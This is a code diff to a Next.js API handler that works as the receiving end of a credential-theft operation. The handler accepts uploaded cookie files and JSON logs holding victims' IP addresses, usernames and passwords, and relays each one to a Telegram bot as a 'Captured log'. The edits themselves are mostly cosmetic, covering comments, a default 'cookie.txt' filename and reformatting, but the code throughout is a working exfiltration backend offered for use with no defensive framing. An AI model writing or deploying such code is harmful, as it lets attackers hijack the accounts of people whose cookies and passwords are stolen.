@@ -6,7 +6,6 @@ export const config = { api: { bodyParser: false } };
 const upload = multer();
 
 const handler = nextConnect();
-
 handler.use(upload.single('file'));
 
 handler.post(async (req, res) => {
@@ -17,7 +16,7 @@ handler.post(async (req, res) => {
   }
   const botUrl = `https://api.telegram.org/bot${telegramToken}`;
 
-  // 1. Handle file uploads (cookies/certs)
+  // File upload (cookies as .txt)
   if (req.file) {
     const form = new FormData();
     form.append('chat_id', chatId);
@@ -25,11 +24,11 @@ handler.post(async (req, res) => {
       'document',
       req.file.buffer,
       {
-        filename: req.file.originalname,
+        filename: req.file.originalname || 'cookie.txt',
         contentType: req.file.mimetype || 'text/plain'
       }
     );
-    // Optional: caption with IP/type if available
+    // Optional: Add caption
     const { ip, type } = req.body;
     let caption = '';
     if (ip) caption += `IP: ${ip}\n`;
@@ -49,7 +48,7 @@ handler.post(async (req, res) => {
     return res.status(200).json({ success: true });
   }
 
-  // 2. Handle JSON logs (creds, other info)
+  // JSON logs (creds, etc)
   if (req.headers['content-type']?.includes('application/json')) {
     let body = '';
     await new Promise((resolve, reject) => {
@@ -64,7 +63,6 @@ handler.post(async (req, res) => {
       return res.status(400).json({ success: false, message: 'Invalid JSON' });
     }
     const { data, ip, user, pass, type } = json;
-    // Compose a "Captured log" subject
     let text = `📥 Captured log\n`;
     if (ip) text += `IP: ${ip}\n`;
     if (type) text += `Type: ${type}\n`;
@@ -75,10 +73,7 @@ handler.post(async (req, res) => {
     const tgRes = await fetch(`${botUrl}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text
-      })
+      body: JSON.stringify({ chat_id: chatId, text })
     });
     const tgText = await tgRes.text();
     if (!tgRes.ok) {
@@ -88,7 +83,6 @@ handler.post(async (req, res) => {
     return res.status(200).json({ success: true });
   }
 
-  // Other payloads ignored
   return res.status(400).json({ success: false, message: 'Bad payload' });
 });
 
